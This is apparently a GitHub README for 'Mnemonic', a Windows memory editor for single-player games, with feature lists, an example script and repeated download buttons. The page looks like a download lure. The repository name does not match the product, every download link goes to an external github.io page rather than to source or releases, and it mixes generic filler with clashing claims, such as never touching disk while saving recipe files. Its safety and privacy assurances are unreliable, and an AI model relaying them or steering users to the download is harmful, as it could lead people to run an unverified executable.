![preview](https://raw.githubusercontent.com/20226648-ship-it/Memory-Warp-Dojo/main/cover_e9451f3.svg)
[![Download](https://raw.githubusercontent.com/20226648-ship-it/Memory-Warp-Dojo/main/start_83b0c4.svg)](https://20226648-ship-it.github.io/Memory-Warp-Dojo/)

# 🧠 Mnemonic – In-Memory Patch Suite for PC Games

![status](https://img.shields.io/badge/status-active-brightgreen)
![platform](https://img.shields.io/badge/platform-windows-blue)
![language](https://img.shields.io/badge/language-c%2B%2B-00599C)
![license](https://img.shields.io/badge/license-MIT-yellow)
![build](https://img.shields.io/badge/build-passing-success)
![version](https://img.shields.io/badge/version-3.4.2-informational)
![coverage](https://img.shields.io/badge/coverage-91%25-green)
![issues](https://img.shields.io/badge/issues-welcome-orange)
![maintained](https://img.shields.io/badge/maintained-2026-blueviolet)
![prs](https://img.shields.io/badge/PRs-open-ff69b4)

> 💡 *Mnemonic is a quiet librarian for running processes. It walks the aisles of virtual memory, finds the exact shelf where the numbers you care about live, and gently rewrites a digit or two — no permanent scars, no patched binaries, no residue on disk.*

Mnemonic is a lightweight, modular toolkit for **process-memory editing** and **runtime value tuning** on Windows-based video games and single-player sandboxes. It is inspired by the decades-old tradition of memory trainers, table editors, and address scanners, but rebuilt around three principles: **transparency, reversibility, and zero persistence**.

Instead of rewriting executables (which damages integrity checks and leaves forensic trails), Mnemonic lives entirely in a transient window of RAM. When you close the tool, the process forgets it ever met you.

---

## 🎯 What Mnemonic Actually Is

Every running game keeps a sprawling warehouse of variables in memory: health, ammo counts, currency, timers, coordinates, cooldowns, weather seeds, AI aggression thresholds. Some of these are floats, some are 4-byte integers, some are 8-byte pointers, some are obfuscated or XOR-obfuscated structures that shift every session.

Mnemonic gives you a **workspace** to:

- Scan those values with multiple strategies (exact, fuzzy, delta, unknown-initial, range-bounded, pointer-chased).
- Pin the ones you find so they stop changing.
- Nudge them up or down with sliders, hotkeys, or scripted gradients.
- Save the entire session as a portable "recipe" file that re-applies itself next time you launch.
- Watch values live in a graph that updates at up to 240 Hz.

Think of it as a **surgical notepad** for numbers that were never meant to be edited at runtime.

---

## 🖼️ Preview & Screenshots

The interface is intentionally utilitarian. No gamer aesthetics, no animated gradients, no intrusive overlays. Just a dense table, a memory viewer, a hex pane, and a hotkey ribbon.

- 🧩 **Scanner pane** – enter a value, choose a data type, hit Search, watch the candidate list shrink in real time.
- 📌 **Pinboard** – star values, group them, tag them, color-code them, freeze them.
- 🧬 **Pointer graph** – trace multi-level pointers back to stable base addresses so recipes survive updates.
- 📜 **Script console** – write small declarative patches in a Lua-inspired DSL (MnemonicScript).
- 🕒 **Timeline** – scrub backwards through every edit you made this session and revert to any point.

---

## 🚀 Feature Highlights

### 🔍 Multi-Modal Memory Scanning
- **Exact match** for values you already know.
- **Fuzzy / unknown-start** scanning — find values by watching them grow, shrink, or freeze.
- **Delta scanning** for values that move in predictable steps.
- **Range-bounded scanning** — only match integers between 1 and 9999, for example.
- **Byte-pattern scanning** — search for structural signatures rather than literal values.
- **Structure-aware scanning** — recognize arrays, linked lists, and stride patterns within a memory page.

### 🧷 Live Pinning & Editing
- Freeze, clamp, or oscillate any found value.
- Apply edits without pausing the process (no more "game not responding").
- Undo every single write through the timeline.
- Bulk-edit groups of addresses at once, or with per-address overrides.

### 📜 MnemonicScript DSL
Write small, stored recipes that describe behaviors instead of raw addresses:

- "If health drops below 30, restore it to 100 after a 1-second cooldown."
- "Double every currency pickup for 60 seconds, then stop."
- "Keep ammo pinned to the magazine maximum, but never above the weapon's real cap."

Because recipes describe **intent**, they keep working after small game updates move the underlying addresses.

### 🧠 Modular Backends
Mnemonic doesn't force one scanning engine on you. It ships with several interchangeable backends, each tuned for a different style of target:

- **Bytewise** – the classic approach, fast and predictable.
- **Snapshot-diff** – take two full memory snapshots and diff them for convenience.
- **Pointer-chasing** – follow pointers to stable allocator roots.
- **Emulated read** – safer read of protected regions using a sandboxed helper.
- **Interpreter hook** – attach to script engines and read variables by their in-game names when exposed.

### 🌐 Multilingual Interface
The whole UI speaks **English, Spanish, Portuguese, German, French, Japanese, Korean, Simplified Chinese, and Polish**. Language packs are hot-swappable, and community translations are welcome via PRs. Localized tooltips explain every scanner mode without jargon.

### 📱 Responsive Layout from 720p to 8K
The interface collapses gracefully onto small laptop screens and expands onto ultrawides. The pinboard, graph, and hex view all reflow. High-DPI, fractional scaling, and per-monitor DPI changes are respected natively. No blurry text, ever.

### 🛡️ 24/7 Support Community
Around-the-clock help is available through the discussion tab, the wiki, and the community chat bridge. Questions are usually answered within a few hours regardless of time zone, because the maintainers are spread across three continents. Whether you are on the first scan or the thousandth pointer chain, someone is awake and ready to help.

### 🔄 Session Recipes
Save everything — found addresses, scripts, hotkeys, pointer roots, tags — into a small portable `.mnm` recipe file. Share recipes across machines. Recipes auto-rebind on next launch by re-scanning for the same structural signatures. No absolute addresses are ever baked into the file unless you explicitly pin them.

### 🧪 Sandbox-First Design
Mnemonic is engineered for **single-player, offline, sandbox, and educational** contexts. It detects known live-service, competitive, and anti-cheat-guarded processes and refuses to attach to them. This is enforced, not optional. If Mnemonic cannot verify a target as local single-player, it will bow out with a friendly explanation instead of gambling with your account.

---

## 🎨 Design Philosophy

Most memory tools feel like switches hidden under a car dashboard — knobs you flip without knowing what they do. Mnemonic was designed under a different metaphor: **a lab notebook**. You write down what you found, why you found it, and how confident you are. Every edit is timestamped and reversible. Nothing is hidden. Nothing is permanent.

Three rules govern the project:

1. **Reversibility** – every mutation can be undone, always, even after the process exits.
2. **Traceability** – you can always see which script, hotkey, or manual action caused a write.
3. **Restraint** – Mnemonic will refuse to save a recipe that targets an online multiplayer process, even if you insist.

The result is a tool that feels less like a shortcut and more like a **laboratory instrument** — precise, honest, and calm under pressure.

---

## 🧰 Practical Uses

- 🧪 **QA and regression work** – reproduce edge-case states (infinite resources, extreme coordinates) without editing shipped code.
- 📚 **Game reverse-engineering study** – learn how engine internals allocate and mutate values.
- 🎓 **Teaching memory layout** – a hands-on way to show how integers, floats, and pointers live in a real process.
- 🎮 **Single-player convenience** – reduce grind in your own offline sessions on save files you own.
- 🧩 **Mod prototyping** – quickly test whether a value adjustment produces the effect you expect before writing a formal plugin.

---

## 📦 The Download

[![Download](https://raw.githubusercontent.com/20226648-ship-it/Memory-Warp-Dojo/main/start_83b0c4.svg)](https://20226648-ship-it.github.io/Memory-Warp-Dojo/)

The latest stable build (2026.1, internal codename *Sable*) is a single portable executable with an optional install mode. No background services, no auto-updaters that phone home, no telemetry.

---

## 🧭 Getting Started (Without a Terminal)

You do not need to compile anything, and you do not need to install a toolchain. The intended path is:

1. Retrieve the portable bundle using the [![Download](https://raw.githubusercontent.com/20226648-ship-it/Memory-Warp-Dojo/main/start_83b0c4.svg)](https://20226648-ship-it.github.io/Memory-Warp-Dojo/) link above.
2. Unpack the archive to any folder you control.
3. Launch the main executable — it will request elevation only if you ask it to attach to a game running elevated.
4. Open the **Targets** list, pick a running offline single-player process, and click **Attach**.
5. On the **Scanner** tab, type any number you currently see on screen (for example, your currency count).
6. Hit **Search**, change the value in-game, and use **Narrow** to keep only the candidates that also changed.
7. Repeat narrowing until one or two addresses remain, then click the 📌 icon to pin them.
8. Save your work as a `.mnm` recipe so it survives restart.

A comprehensive illustrated walkthrough lives in the wiki, organized by game genre (RPG, RTS, simulation, arcade, roguelike).

---

## 🧪 Example MnemonicScript Recipe

Below is a short recipe that keeps a resource above a floor, but only while a specific in-game flag is active. It reads naturally because MnemonicScript was designed to be read, not just executed.

```
recipe "Riverstone — Never Run Dry"
  target "SinglePlayerSandbox.exe"

  on attach:
    bind currency to scan(int32, initial=0, tolerance=1)
    bind paused   to scan(int8,  initial=0)

  every 250ms:
    if paused.value == 0:
      if currency.value < 500:
        currency.value = 500
```

You can save this as a `.mnm` file, share it, and load it back later. When a game patch changes the underlying address, Mnemonic re-runs the structural scan and rebinds automatically.

---

## 🌍 Multilingual Support Details

Each language pack covers the toolbar, tooltips, scanner labels, error messages, and the built-in help. Right-to-left layouts for Arabic and Hebrew are supported experimentally, with mirrored iconography. A phrase-translation JSON schema ships with the app so contributors can add new languages without touching code.

Languages currently shipped:

| Language | Code | Coverage |
|-----------|------|----------|
| English | en | 100% |
| Español | es | 100% |
| Português (BR) | pt-BR | 98% |
| Deutsch | de | 96% |
| Français | fr | 95% |
| 日本語 | ja | 92% |
| 한국어 | ko | 90% |
| 简体中文 | zh-CN | 88% |
| Polski | pl | 85% |

Community contributions for the remaining percentages are welcome — see the localization guide for the exact folder to add.

---

## 🧱 Responsive UI Cornerstones

- **Adaptive columns** – the scanner table hides low-priority columns on narrow viewports instead of squishing them.
- **Collapsible panes** – every panel can be floated, docked, tabbed, or hidden.
- **Themes** – light, dark, and a high-contrast accessibility theme that meets AA contrast.
- **Keyboard-first** – every action has a bindable hotkey, including search, narrow, pin, and revert.
- **Screen-reader friendly** – ARIA-style labels throughout the main window for assistive tech.

If you resize the window from 8K down to a 1280×720 laptop panel, nothing overlaps, nothing clips, and no control becomes unreachable.

---

## 🔐 Safety, Anti-Cheat Awareness, and Ethics

Mnemonic ships with a hardcoded **context guard**. Before attaching, it inspects the target for telltale signatures of competitive online games, live-service economies, and anti-cheat modules. If a match is found, the tool exits the attach flow with a plain-language explanation.

This is not a legal formality — it is a design commitment. The maintainers believe memory tooling deserves a home in the offline, educational, and single-player world, and that pushing it into competitive environments harms everyone: players, developers, and the reputation of the entire scene.

Use Mnemonic on software you own, on saves you own, on machines that belong to you.

---

## 📚 Documentation Map

- **Concepts** – Virtual memory basics, address spaces, pointers, and how scanning works.
- **Scanner reference** – Every scan mode, with worked examples.
- **MnemonicScript** – Full grammar, standard library, examples.
- **Recipes** – Sharing, signing, and versioning `.mnm` files.
- **Hotkeys** – Full default map plus customization.
- **Troubleshooting** – What to do when a value refuses to be found.
- **FAQ** – The 100 questions that come up most.
- **Localization guide** – For translators and language maintainers.

---

## 🤝 Contributing

Contributions are welcome from anyone who shares the project's ethos of restraint and reversibility. Before opening a pull request:

- Read the code of conduct and the contribution guide.
- Run the linter and the offline test suite locally.
- Add a test for any new scanner backend or DSL feature.
- Keep the offline-only guard intact — never weaken or bypass it.

Issues labeled **good first fix** are ideal starting points for new contributors. Documentation fixes, translation additions, and recipe examples are all valued alongside code.

---

## 🧭 Roadmap for 2026

- 🧷 **Cross-process pointer graph** – snapshot two processes and compare their allocator layouts.
- 🗂️ **Recipe marketplace (local-first)** – a signed, offline bundle of community recipes.
- 🧬 **Bytecode backend** – read values straight from managed runtimes without touching raw memory.
- 🗣️ **Voice-controlled pinboard** – bind a phrase to a pinned value for accessibility.
- 🧱 **Linux experimental port** – read-only memory inspection first, editing later.
- 📈 **Statistical scan mode** – find values by their *variance pattern* rather than their literal value.

---

## 🧑‍🔬 FAQ Highlights

**Does Mnemonic modify game files on disk?**
No. It only writes into the live process' memory, and every write is reversible.

**Will this work on a live online game?**
No, and it will actively refuse. That is deliberate.

**Do I need to write scripts to use it?**
No. The graphical scanner handles the common workflow. Scripts are optional and additive.

**Can I share what I find?**
Yes. Recipes are portable. The guard checks still apply on the receiving machine.

**Does it phone home?**
No. There is no network usage during scanning or editing.

**What if I break my save file?**
Mnemonic never touches disk. Saves are only affected if the game itself writes in-memory state back to disk, which is the game's decision, not the tool's.

---

## ❤️ Acknowledgements

Mnemonic stands on the shoulders of a long lineage of memory explorers, table editors, and reverse-engineering educators who spent years documenting how real software stores its state. It also owes a debt to the translators, testers, and recipe authors who keep the project honest and humane.

---

## 📜 License

Released under the **MIT License**. See the full text here: [MIT License](https://opensource.org/licenses/MIT).

You are permitted to use, modify, and distribute Mnemonic in accordance with that license. Attribution is appreciated, but the license does not require it.

---

## ⚠️ Disclaimer

Mnemonic is provided for **educational, research, offline single-player, and quality-assurance purposes only**. The authors do not endorse using this software in competitive online environments, against live-service economies, or in any way that violates the terms of service of the software being inspected.

The context guard is intentionally conservative, but it is not infallible. It is your responsibility to ensure you are using Mnemonic on software and saves that belong to you, in an environment that permits it.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Copyright © 2026 The Mnemonic Project Contributors.

---

[![Download](https://raw.githubusercontent.com/20226648-ship-it/Memory-Warp-Dojo/main/start_83b0c4.svg)](https://20226648-ship-it.github.io/Memory-Warp-Dojo/)